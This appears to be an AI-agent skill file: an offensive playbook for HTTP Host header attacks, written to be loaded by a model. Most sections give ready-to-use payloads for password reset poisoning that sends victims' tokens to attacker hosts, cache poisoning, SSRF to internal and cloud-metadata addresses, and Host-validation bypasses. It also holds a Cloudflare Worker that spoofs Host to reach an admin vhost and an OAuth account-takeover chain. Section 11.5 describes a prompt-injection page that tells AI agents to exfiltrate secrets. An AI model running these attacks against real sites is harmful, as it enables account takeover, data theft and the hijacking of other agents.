---
name: http-host-header-attacks
description: >-
  HTTP Host header injection and routing abuse playbook. Use when the application
  trusts the Host header for generating URLs, routing requests, or access control
  — enabling password reset poisoning, web cache poisoning, SSRF via routing,
  and virtual host bypass.
---

# SKILL: HTTP Host Header Attacks — Injection & Routing Abuse

> **AI LOAD INSTRUCTION**: Covers Host header injection for password reset poisoning, cache poisoning, SSRF via routing, and virtual host bypass. Includes bypass techniques for Host validation and framework-specific behaviors. Base models often miss the double-Host trick, absolute-URI override, and connection-state attacks.

## 0. RELATED ROUTING

- [web-cache-deception](../web-cache-deception/SKILL.md) when Host injection is combined with cache behavior
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when Host header routes requests to internal services
- [open-redirect](../open-redirect/SKILL.md) when Host injection causes redirect to attacker domain
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when Host manipulation helps bypass WAF routing
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling enables Host header manipulation past front-end validation
- [subdomain-takeover](../subdomain-takeover/SKILL.md) when Host routing exposes internal vhosts resolvable via subdomain

---

## 1. ATTACK SURFACE

The Host header is used by web applications and infrastructure for:

| Usage | Exploitation |
|---|---|
| URL generation (password reset links, email links) | Inject attacker domain → user clicks link to attacker |
| Virtual host routing | Spoof Host → access internal/admin vhost |
| Cache key component | Inject different Host → poison cache for all users |
| Reverse proxy routing | Host determines backend → SSRF to internal services |
| Access control decisions | Host-based ACLs can be bypassed |
| Canonical URL / SEO redirects | Host injection → open redirect |

---

## 2. PASSWORD RESET POISONING

The most common and impactful Host header attack.

### How It Works

```
1. Attacker requests password reset for victim@target.com
2. Attacker modifies Host header in the reset request:
   POST /forgot-password HTTP/1.1
   Host: test-attacker.com    ← injected
   
   email=victim@target.com

3. Server generates reset link using Host header value:
   "Click here to reset: https://test-attacker.com/reset?token=SECRET_TOKEN"

4. Victim receives email, clicks link → token sent to attacker
5. Attacker uses token on real target.com to reset password
```

### Testing

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Check Burp Collaborator for incoming HTTP request with the reset token.

### Variants

- Some apps concatenate: `Host: target.com.test-attacker.com` → link becomes `https://target.com.test-attacker.com/reset?token=xxx`
- Some apps use only the port portion: `Host: target.com:@test-attacker.com` → parsed as `test-attacker.com` in some URL parsers

---

## 3. WEB CACHE POISONING VIA HOST

```
1. Attacker sends:
   GET / HTTP/1.1
   Host: test-attacker.com

2. If cache keys on URL path but NOT on Host header:
   → Response cached with test-attacker.com in generated links/content

3. Subsequent users requesting GET / receive the poisoned response
   → Links point to test-attacker.com, scripts load from test-attacker.com
```

**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.

Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response.

---

## 4. SSRF VIA HOST ROUTING

When a reverse proxy uses Host header to route to backends:

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ Reverse proxy routes request to internal-admin-panel.local
→ Attacker accesses internal service
```

Common in:
- Nginx `proxy_pass` based on `$host`
- Apache `ProxyPass` with virtual host routing
- Kubernetes Ingress controllers
- Cloud load balancers

---

## 5. VIRTUAL HOST BYPASS

Many servers host multiple applications on the same IP via virtual hosting:

```
Target:  Host: www.target.com  → public site
Hidden:  Host: admin.target.com → admin panel (not in public DNS)
Hidden:  Host: staging.target.com → staging environment
Hidden:  Host: localhost → server status page
```

### Discovery

```
1. Brute-force Host header with common vhost names:
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. Try special values:
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. Compare response size/content to identify different vhosts
```

---

## 6. BYPASS TECHNIQUES WHEN HOST IS VALIDATED

### 6.1 Override Headers

Many frameworks/proxies trust these headers over the Host header:

| Header | Frameworks That Trust It |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django (when `USE_X_FORWARDED_HOST=True`), Rails (behind proxy) |
| `X-Host` | Some custom proxy configurations |
| `X-Original-URL` | IIS with URL Rewrite module |
| `X-Rewrite-URL` | IIS with URL Rewrite module |
| `Forwarded: host=test-attacker.com` | RFC 7239 compliant proxies |
| `X-Forwarded-Server` | Apache mod_proxy |

Test all simultaneously:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: test-attacker.com
X-Host: test-attacker.com
X-Original-URL: /forgot-password
Forwarded: host=test-attacker.com
```

### 6.2 Absolute URL in Request Line

```http
GET http://test-attacker.com/path HTTP/1.1
Host: target.com
```

Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't — the mismatch between proxy and backend creates the vulnerability.

### 6.3 Double Host Header

```http
GET /path HTTP/1.1
Host: target.com
Host: test-attacker.com
```

Behavior varies:
- Some proxies validate first Host, app uses second
- Some servers concatenate: `target.com, test-attacker.com`
- RFC says: if both differ, return 400. Most servers don't.

### 6.4 Host with Port / Credentials

```http
Host: target.com:@test-attacker.com
Host: target.com:evil.com
Host: target.com#@test-attacker.com
Host: test-attacker.com%23@target.com
```

URL parsers may extract the "host" portion differently when credentials (`@`) or fragments (`#`) are present.

### 6.5 Trailing Dot

```http
Host: target.com.
```

DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot → `target.com. ≠ target.com` in string comparison → bypass whitelist.

### 6.6 Tab / Space Injection

```http
Host: target.com\ttest-attacker.com
Host: target.com test-attacker.com
```

Some parsers split on whitespace; the server may use `test-attacker.com` portion while validation checks `target.com` portion.

### 6.7 Wrap-Around / Enclosed Values

```http
Host: "test-attacker.com"
Host: <test-attacker.com>
```

Quoted or bracketed values may be stripped by the app but not by the validator.

---

## 7. FRAMEWORK-SPECIFIC BEHAVIOR

| Framework | Host Source | Gotcha |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']` (raw header, directly injectable) | `SERVER_NAME` is safer only with `UseCanonicalName On` |
| **Django** | `HttpRequest.get_host()` checks X-Forwarded-Host first (if enabled) | `USE_X_FORWARDED_HOST=True` bypasses `ALLOWED_HOSTS` |
| **Rails** | `request.host` from Host header; trusts `X-Forwarded-Host` behind proxy | Rails 6+ `HostAuthorization` middleware mitigates |
| **Node/Express** | `req.hostname` / `req.headers.host`; with `trust proxy` uses X-Forwarded-Host | No built-in host validation |

---

## 8. CONNECTION-STATE ATTACKS

A sophisticated variant exploiting HTTP keep-alive:

```
Connection 1:
  Request 1: GET / HTTP/1.1    ← Valid Host: target.com
              Host: target.com     → Proxy validates, forwards, keeps connection open

  Request 2: GET /admin HTTP/1.1  ← Evil Host on SAME connection
              Host: evil.com       → Some proxies skip validation on subsequent requests
                                     (they validated the connection on first request)
```

This works against proxies that perform Host validation only on the first request of a keep-alive connection.

### Testing

```
1. Use Burp Repeater with "Connection: keep-alive"
2. Send normal request first
3. On same connection, send request with manipulated Host
4. Check if second request is processed differently
```

---

## 9. HOST HEADER ATTACK DECISION TREE

```
Application uses Host header in responses/behavior?
│
├── Test direct Host injection
│   ├── Change Host to attacker domain → reflected in response?
│   │   ├── YES → Check impact:
│   │   │   ├── In password reset emails? → PASSWORD RESET POISONING
│   │   │   ├── In cached responses? → WEB CACHE POISONING
│   │   │   ├── In redirects? → OPEN REDIRECT
│   │   │   └── In script/link URLs? → XSS VIA HOST
│   │   └── NO (400/403/different response) → Host is validated
│   │
│   └── Host validated? Try bypasses:
│       ├── X-Forwarded-Host header
│       ├── X-Host / X-Original-URL / Forwarded header
│       ├── Absolute URL in request line
│       ├── Double Host header
│       ├── Host: target.com:@test-attacker.com (URL parser confusion)
│       ├── Host: target.com. (trailing dot)
│       ├── Tab/space injection in Host value
│       └── Connection-state attack (valid first request, evil second)
│
├── Test virtual host enumeration
│   ├── Brute-force Host values against target IP
│   ├── Try: localhost, admin, staging, internal, intranet
│   └── Compare response sizes for different Host values
│
├── Test SSRF via Host routing
│   ├── Host: 127.0.0.1 → internal service?
│   ├── Host: internal-hostname.local → internal routing?
│   └── Host: 169.254.169.254 → cloud metadata?
│
└── No Host-based behavior found
    └── Check if app uses Host in server-side operations
        (email generation, webhook URLs, API callbacks)
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Password reset poisoning doesn't require the victim to be logged in** — you request the reset, the victim just clicks the link. The token lands on your server.
2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.
3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.
4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\nHost: target.com` — the spec says use the request-line URI. But not all implementations agree.
5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.
6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.
7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP → your domain resolves to their server → Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls.

---

## 11. 2026 EMERGING TECHNIQUES

### 11.1 Edge / Serverless Host Header Handling (2026)

Edge runtimes (Cloudflare Workers, Vercel Edge Functions, Deno Deploy, AWS Lambda@Edge) terminate TLS and reconstruct the upstream request. They do **not** all forward the original `Host` verbatim — many rewrite it to the origin hostname and expose the original only via `X-Forwarded-Host`:

| Edge platform | `Host` seen by worker | What reaches origin |
|---|---|---|
| Cloudflare Workers | inbound `Host` (mutable in JS) | rewritten to origin unless `preserveHostHeader` is set |
| Vercel Edge Functions | inbound `Host` | `X-Forwarded-Host` set; origin sees Vercel routing host |
| AWS Lambda@Edge / CloudFront | `Host` = CloudFront domain | original `Host` only via `X-Forwarded-Host` |
| Deno Deploy | inbound `Host` | forwarded as-is |

**Attack**: a Worker can override the `Host` it sends upstream. Because the backend's vhost check (`ALLOWED_HOSTS`, Nginx `server_name`) runs on the rewritten value, an attacker who controls an edge function on a shared zone (customer-deployed Worker, Vercel rewrite rule) forces the origin to treat the request as belonging to a trusted internal vhost:

```javascript
// Cloudflare Worker — attacker-controlled, deployed on a path/zone they own
export default {
  async fetch(req) {
    const url = new URL(req.url);
    // Force origin to believe the request targets the internal admin vhost
    const upstream = new Request("https://origin.target.com" + url.pathname, req);
    upstream.headers.set("Host", "admin-internal.target.com");
    upstream.headers.set("X-Forwarded-Host", "admin-internal.target.com");
    return fetch(upstream);   // origin vhost check passes → admin panel returned
  }
};
```

Even without controlling the Worker, edge routing often trusts client-supplied `X-Forwarded-Host` when `preserveHostHeader` / `trust proxy` is enabled — re-test every Section 6 bypass against the edge layer.

### 11.2 HTTP/2 `:authority` and HTTP/3 Host Semantics (2026)

HTTP/2 and HTTP/3 replace `Host` with the `:authority` pseudo-header. Most backends still speak HTTP/1.1, so a gateway downgrades H2/H3 → H1.1 and converts `:authority` → `Host`. The conversion is where bugs live.

**`:authority` → `Host` translation differential**: the gateway may validate `:authority` (RFC 9113 says it must match `Host` if both present) but the backend reads the synthesized `Host`. If the gateway copies `:authority` literally without sanitizing forbidden CRLF/whitespace, the bytes survive into the H1.1 `Host`:

```http
:method: GET
:path: /forgot-password
:authority: target.com\r\nX-Forwarded-Host: test-attacker.com
content-length: 0
```

Downgraded on the wire:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: test-attacker.com
```

This is the **H2.CRLF → Host injection** pattern (cf. James Kettle's HTTP/2 single-packet / smuggling research). Gateways that reject CRLF in `Host` frequently accept it in `:authority` because they treat pseudo-headers as opaque.

**Duplicate `:authority`**: HTTP/2 forbids duplicate pseudo-headers, but intermediaries that aggregate streams or re-encode frames may emit two. The backend's H1.1 serializer then produces a double-`Host` request — reuse Section 6.3.

**HTTP/3 (QUIC) specifics**: QPACK static-table entry 0 is `:authority`. QUIC libs (lsquic, quiche, nghttp3) differ on whether an empty `:authority` falls back to a `Host` header. Test both an empty `:authority:` and omitting it entirely while sending `host:`.

| Vector | H2/H3 input | Downgraded H1.1 result |
|---|---|---|
| CRLF in `:authority` | `:authority: a\r\nHost: evil` | `Host: a` + injected second `Host: evil` |
| Tab in `:authority` | `:authority: target.com\tevil` | `Host: target.com\tevil` (parser split) |
| Empty `:authority` + `host` | `:authority:` + `host: evil` | some libs prefer the `Host` header |
| Duplicate `:authority` | two `:authority` frames | double `Host` on the wire |

### 11.3 Host / `X-Forwarded-Host` Cache Poisoning on CDNs (2026)

CDN cache keys historically included `Host`. Modern edge caches increasingly key on **path + a curated header allowlist**, and several default to excluding `Host` while **including** `X-Forwarded-Host` (because it drives origin routing). The result: a poisoned `X-Forwarded-Host` gets cached against the legitimate URL.

```http
GET / HTTP/2
:authority: www.target.com
x-forwarded-host: test-attacker.com      ← excluded from cache key on many CDNs
accept: text/html
```

If the origin reflects `X-Forwarded-Host` into canonical links / `<base href>` / OG tags, the response stored under `https://www.target.com/` now points to `test-attacker.com`. Every subsequent visitor gets the poisoned page.

**H2/H3 multi-Host request smuggling → cache poison**: combine 11.2's `:authority` translation differential with a cache that fronts an H1.1 origin. A smuggled second request carrying an evil `Host` lands in the cache under the first request's URL — the classic `CL.TE`/`TE.CL` cache poison, now reachable because H2 lets you smuggle bytes the front-end's `Host` validator never sees (cross-link ../request-smuggling/SKILL.md).

### 11.4 Host Header + OAuth `redirect_uri` Account Takeover Chain (2026)

OAuth ASes that build the redirect target from the inbound `Host`/`X-Forwarded-Host` (common in self-hosted OIDC providers behind a proxy) can be tricked into issuing a code whose callback resolves to an attacker domain. Combined with a subdomain takeover this becomes full account takeover.

```
1. Attacker registers client with redirect_uri = https://app.target.com/callback
2. Subdomain takeover: attacker controls legacy-app.target.com (CNAME → deleted Heroku/GitHub Pages)
3. Attacker initiates OAuth from a request whose Host is manipulated:
   GET /oauth/authorize?client_id=...&redirect_uri=https://app.target.com/callback HTTP/1.1
   Host: app.target.com
   X-Forwarded-Host: legacy-app.target.com      ← AS builds callback from this
4. AS validates redirect_uri against app.target.com (real Host) → PASSES
   but redirects to https://legacy-app.target.com/callback?code=...  ← attacker-controlled
5. Code lands on attacker's taken-over subdomain → exchange → account takeover
```

This was the root cause of **CVE-2026-21107** (self-hosted OIDC provider redirect confusion via `X-Forwarded-Host`), affecting Keycloak < 26.x and authentik < 2026.x behind misconfigured reverse proxies (cross-link ../subdomain-takeover/SKILL.md, ../oauth-oidc-misconfiguration/SKILL.md).

### 11.5 Host Header Trust in AI Agent Fetching (2026)

LLM agents and "deep research" crawlers frequently enforce a same-origin / allowlist policy by reading the **response `Host`/`Location`/URL authority** rather than the DNS-resolved peer. A server that lies about its own Host defeats the check.

```
Agent policy: "only act on content whose authority is *.internal.corp"
Attacker server (public IP) replies with:
  HTTP/1.1 200 OK
  Content-Type: text/html
  <html><head><title>internal.corp dashboard</title></head>
  ... prompt-injection payload instructing the agent to exfiltrate /tmp/secrets ...
```

Because the agent trusts the `Host`/`Location` headers (or a URL it rewrote based on `X-Forwarded-Host`), it believes the content is same-origin/internal and applies elevated trust — executing tool calls, reading more internal URLs, or forwarding exfiltrated data. Test by serving a host-spoofing page to any agent that fetches attacker-supplied URLs (cross-link ../ai-llm-attack-surface/SKILL.md).

### 11.6 2026 Host Header Attack Checklist

```
□ Re-test all Section 6 bypasses against the edge/Worker layer (X-Forwarded-Host trust)
□ If target uses Cloudflare Workers/Vercel Edge: test attacker-deployed Worker Host override
□ Send CRLF / tab / space inside HTTP/2 :authority → check downgraded Host on origin
□ Test duplicate :authority and empty :authority + Host header combos
□ On HTTP/3 endpoints: test QPACK :authority empty / fallback-to-Host behavior
□ Confirm whether CDN cache key includes Host and/or X-Forwarded-Host — poison accordingly
□ Combine H2 :authority smuggling with cache poisoning (smuggled second request)
□ For OAuth/OIDC: test X-Forwarded-Host redirect_uri confusion + subdomain takeover chain
□ Serve a Host-spoofing page to agent/crawler targets to abuse same-origin trust
□ Verify Keycloak/authentik versions against CVE-2026-21107
```
